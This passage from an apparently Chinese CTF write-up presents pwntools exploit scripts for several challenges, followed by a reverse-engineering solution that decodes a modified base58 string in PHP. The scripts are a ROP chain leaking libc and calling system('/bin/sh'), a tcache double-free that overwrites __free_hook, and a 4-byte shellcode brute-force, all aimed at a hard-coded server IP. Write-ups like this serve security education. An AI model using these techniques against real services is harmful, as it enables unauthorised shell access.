class="number">0</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line">def inputFloat(<span class="built_in">num</span>):</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.<span class="built_in">send</span>(<span class="built_in">num</span>)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline()</span><br><span class="line">def inputRop(<span class="built_in">num</span>):</span><br><span class="line">	<span class="built_in">num</span> = str(<span class="built_in">num</span>)</span><br><span class="line">	<span class="built_in">num</span> = <span class="built_in">num</span>.rjust(<span class="number">45</span>,<span class="string">"0"</span>)</span><br><span class="line">	<span class="built_in">num</span> = <span class="built_in">num</span>.ljust(<span class="number">0x62</span>,<span class="string">"0"</span>)</span><br><span class="line">	inputFloat(<span class="string">"0."</span> + <span class="built_in">num</span>)</span><br><span class="line">	inputFloat(<span class="string">"0"</span>)	</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	<span class="built_in">global</span> sh</span><br><span class="line">	<span class="built_in">global</span> lib</span><br><span class="line">	<span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">		sh = <span class="built_in">process</span>(<span class="string">"./pwn2"</span>)</span><br><span class="line">		lib = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF(<span class="string">"libc6_2.27-3ubuntu1_amd64.so"</span>)</span><br><span class="line">	<span class="comment">#puts 5879714 0x400640</span></span><br><span class="line">	<span class="comment">#pop_rdi 5881041 0x4009f3</span></span><br><span class="line">	<span class="comment">#__libc_start_main_got 8822026 0x601038</span></span><br><span class="line">	<span class="comment">#main 5880847 0x400969</span></span><br><span class="line">	<span class="comment">#start 5879938 0x4006E0</span></span><br><span class="line">	<span class="comment">#call vul 5880867 0x400977</span></span><br><span class="line">	<span class="comment">#vul 5880653 0x4008DE</span></span><br><span class="line">	<span class="comment">#read 5879781 0x400670</span></span><br><span class="line">	<span class="comment">#pop_rsi_r15_ret 5881038 0x4009f1</span></span><br><span class="line">	<span class="comment">#read_got 8822014 0x601030</span></span><br><span class="line">	<span class="comment">#binsh 8822106 0x601071</span></span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(<span class="string">"-1.9999"</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">		inputFloat(<span class="string">"111"</span>)</span><br><span class="line">	inputFloat(<span class="string">"13"</span>)</span><br><span class="line">	inputFloat(<span class="string">"13"</span>)</span><br><span class="line">	inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#0x11</span></span><br><span class="line">	inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#fake</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#rip = 0x4009f3</span></span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#__libc_start_main got</span></span><br><span class="line">	inputRop(<span class="number">8822026</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#puts_plt</span></span><br><span class="line">	inputRop(<span class="number">5879714</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">	inputRop(<span class="number">5881038</span>)</span><br><span class="line">	inputRop(<span class="number">8822106</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#read_plt</span></span><br><span class="line">	inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">	inputRop(<span class="number">5881038</span>)</span><br><span class="line">	inputRop(<span class="number">8822014</span>)</span><br><span class="line">	inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#read_plt</span></span><br><span class="line">	inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#pop_rdi_ret</span></span><br><span class="line">	inputRop(<span class="number">5881041</span>)</span><br><span class="line">	inputRop(<span class="number">8822106</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#read_plt</span></span><br><span class="line">	inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#input()</span></span><br><span class="line">	sh.recvuntil(<span class="string">"plz input your float:"</span>)</span><br><span class="line">	sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"do you want to continue?(y/n)"</span>)</span><br><span class="line">	sh.<span class="built_in">send</span>(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">	__libc_start_main = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">	libc = __libc_start_main - lib.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">	<span class="keyword">system</span> = libc + lib.symbols[<span class="string">'system'</span>]</span><br><span class="line">	binsh = libc + lib.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">	sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line">	sh.sendline(p64(<span class="keyword">system</span>))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"__libc_start_main: "</span> + hex(__libc_start_main))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"system: "</span> + hex(<span class="keyword">system</span>))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"binsh: "</span> + hex(binsh))</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">"libc: "</span> + hex(libc))</span><br><span class="line">	sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10002</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/71.png" alt="71"></p>
<h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 可以看到程序没有开PIE,同时bss中存放了_IO_2_1_stdout_的地址,并且libc2<span class="number">.27</span>有<span class="keyword">double</span> <span class="built_in">free</span>,所以思路就很明确了.有了<span class="keyword">double</span> <span class="built_in">free</span>就可以<span class="built_in">malloc</span> <span class="number">2</span> everywhere,所以这样一的难点在于如何leak libc,通过<span class="keyword">double</span> <span class="built_in">free</span>,可以让fd指向_IO_2_1_stdout_,从而<span class="built_in">malloc</span> <span class="number">2</span> _IO_2_1_stdout_,从而修改write_base来leak libc,之后再<span class="keyword">double</span> <span class="built_in">free</span>去修改free_hook为system,去<span class="built_in">free</span>一个/bin/sh就可以了</span><br></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"47.110.227.208"</span>,<span class="number">10006</span>)</span><br><span class="line"></span><br><span class="line"># CyCTF&#123;Tc4ch3_Att4ck_Is_S1mpl3_R1ght?&#125;</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    #sh.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="keyword">delete</span>(<span class="built_in">index</span>):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input the index: '</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'\n'</span>)</span><br><span class="line">    </span><br><span class="line">    add2(<span class="number">0</span>x100,p64(<span class="number">0</span>xfbad1880)+p64(<span class="number">0</span>x0)*<span class="number">3</span>+<span class="string">'\x20\n'</span>)</span><br><span class="line">    libc_base=u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-<span class="number">0</span>x3eb780</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="built_in">system</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x10,<span class="string">'/bin/sh\x00\n'</span>) # <span class="built_in">index</span> <span class="number">7</span></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,<span class="string">'\n'</span>) # <span class="built_in">index</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(<span class="built_in">system</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/90.png" alt="90"></p>
<h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'CRITICAL'</span></span><br><span class="line"></span><br><span class="line">#context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">def flag_index(<span class="built_in">index</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.send(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'tell me your name size:\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your name:\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="keyword">open</span>(<span class="string">'./pwn4_flag'</span>,<span class="string">'a+'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">index</span> in <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>x1,<span class="number">0</span>x7f):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>=remote(<span class="string">'47.110.227.208'</span>,<span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">            #sh=process(<span class="string">'./pwn4'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'this is my gift for you, take it!\n'</span>)</span><br><span class="line"></span><br><span class="line">            flag_index(<span class="built_in">index</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'input your code:\n'</span>)</span><br><span class="line"></span><br><span class="line">            code(<span class="string">'AQX\xC3'</span>)</span><br><span class="line"></span><br><span class="line">            padding=<span class="string">'a'</span>.ljust(i,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">            name(<span class="number">0</span>x100,padding)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'Hello are you ready? '</span>+padding+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.sendline()</span><br><span class="line"></span><br><span class="line">            info = <span class="keyword">sh</span>.recv()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((info).<span class="keyword">find</span>(<span class="string">'bye!'</span>) != -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">print</span>  chr(i+<span class="number">0</span>x16)</span><br><span class="line"></span><br><span class="line">                flag.<span class="keyword">write</span>(chr(i+<span class="number">0</span>x16))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">except KeyboardInterrup<span class="variable">t:</span></span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">excep<span class="variable">t:</span></span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/87.png" alt="87"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>（emmm这一题偷懒了），</p>
<p>首先分析主函数</p>
<p>里面有两个check函数。进入checktime（）函数，关键代码是这里，</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> *(&amp;v5 + i) = rand();</span><br><span class="line">if ( <span class="number">14766</span> * v11 + <span class="number">18242</span> * v10 + <span class="number">4657</span> * v9 + <span class="number">22453</span> * v8 + <span class="number">7236</span> * v7 + <span class="number">28554</span> * v6 + <span class="number">25606</span> * v5 + <span class="number">12289</span> * v12 == <span class="number">12977737</span></span><br><span class="line">  &amp;&amp; <span class="number">27429</span> * v11 + <span class="number">8015</span> * v10 + <span class="number">16511</span> * v9 + <span class="number">17180</span> * v8 + <span class="number">27141</span> * v7 + <span class="number">31813</span> * v6 + <span class="number">7412</span> * v5 + <span class="number">18249</span> * v12 == <span class="number">15081473</span></span><br><span class="line">  &amp;&amp; <span class="number">2846</span> * v11 + <span class="number">28353</span> * v10 + <span class="number">19864</span> * v9 + <span class="number">27377</span> * v8 + <span class="number">9006</span> * v7 + <span class="number">13657</span> * v6 + <span class="number">19099</span> * v5 + <span class="number">25835</span> * v12 == <span class="number">13554960</span></span><br><span class="line">  &amp;&amp; <span class="number">1078</span> * v11 + <span class="number">5007</span> * v10 + <span class="number">6568</span> * v9 + <span class="number">23034</span> * v8 + <span class="number">10150</span> * v7 + <span class="number">22949</span> * v6 + <span class="number">32646</span> * v5 + <span class="number">15255</span> * v12 == <span class="number">11284005</span></span><br><span class="line">  &amp;&amp; <span class="number">8010</span> * v11 + <span class="number">15430</span> * v10 + <span class="number">6657</span> * v9 + <span class="number">1009</span> * v8 + <span class="number">25691</span> * v7 + <span class="number">15960</span> * v6 + <span class="number">19493</span> * v5 + <span class="number">29491</span> * v12 == <span class="number">10759932</span></span><br><span class="line">  &amp;&amp; <span class="number">4605</span> * v11 + <span class="number">14468</span> * v10 + <span class="number">5017</span> * v9 + <span class="number">12805</span> * v8 + <span class="number">22973</span> * v7 + <span class="number">30584</span> * v6 + <span class="number">12620</span> * v5 + <span class="number">32085</span> * v12 == <span class="number">12085266</span></span><br><span class="line">  &amp;&amp; <span class="number">7478</span> * v11 + <span class="number">6524</span> * v10 + <span class="number">25994</span> * v9 + <span class="number">16215</span> * v8 + <span class="number">12864</span> * v7 + <span class="number">20574</span> * v6 + <span class="number">8882</span> * v5 + <span class="number">14794</span> * v12 == <span class="number">11323393</span></span><br><span class="line">  &amp;&amp; <span class="number">15263</span> * v11 + <span class="number">8821</span> * v10 + <span class="number">25489</span> * v9 + <span class="number">9598</span> * v8 + <span class="number">26847</span> * v7 + <span class="number">5175</span> * v6 + <span class="number">6515</span> * v5 + <span class="number">27411</span> * v12 == <span class="number">11677607</span> )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p>一共8位字符，猜测前5位为<strong>flag{</strong>然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）</p>
<p>得到    flag{Th3</p>
<p>然后来到关键的check函数，看到这里，</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line"> &#123;</span><br><span class="line">   for ( j = 0; !v12[j]; ++j )</span><br><span class="line">     ;</span><br><span class="line">  <span class="built_in"> if </span>( j &gt;= v11 )</span><br><span class="line">     break;</span><br><span class="line">   v9 = 0;</span><br><span class="line">   while ( j &lt; v11 )</span><br><span class="line">   &#123;</span><br><span class="line">     v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">     v12[j] = v1 / 58;</span><br><span class="line">     v9 = v1 % 58;</span><br><span class="line">     ++j;</span><br><span class="line">   &#125;</span><br><span class="line">   v2 = v5++;</span><br><span class="line">   s[v2] = v9;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>再加上用来取值的table  123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy</p>
<p>意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$encode = <span class="string">"fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>.$encode;</span><br><span class="line"></span><br><span class="line">$decode = base58_decode($encode);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>.$decode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base58_encode</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $alphabet = <span class="string">'123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'</span>;</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_string($string) === <span class="keyword">false</span> || !strlen($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $bytes = array_values(unpack(<span class="string">'C*'</span>, $string));</span><br><span class="line">    $decimal = $bytes[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span><br><span class="line">        $decimal = bcmul($decimal, <span class="number">256</span>);</span><br><span class="line">        $decimal = bcadd($decimal, $bytes[$i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $output = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span> ($decimal &gt;= $base) &#123;</span><br><span class="line">        $div = bcdiv($decimal, $base, <span class="number">0</span>);</span><br><span class="line">        $mod = bcmod($decimal, $base);</span><br><span class="line">        $output .= $alphabet[$mod];</span><br><span class="line">        $decimal = $div;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($decimal &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $output .= $alphabet[$decimal];</span><br><span class="line">    &#125;</span><br><span class="line">    $output = strrev($output);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (string) $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base58_decode</span><span class="params">($base58)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $alphabet = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span>;</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_string($base58) === <span class="keyword">false</span> || !strlen($base58)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $indexes = array_flip(str_split($alphabet));</span><br><span class="line">    $chars = str_split($base58);</span><br><span class="line">    <span class="keyword">foreach</span> ($chars <span class="keyword">as</span> $char) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($indexes[$char]) === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    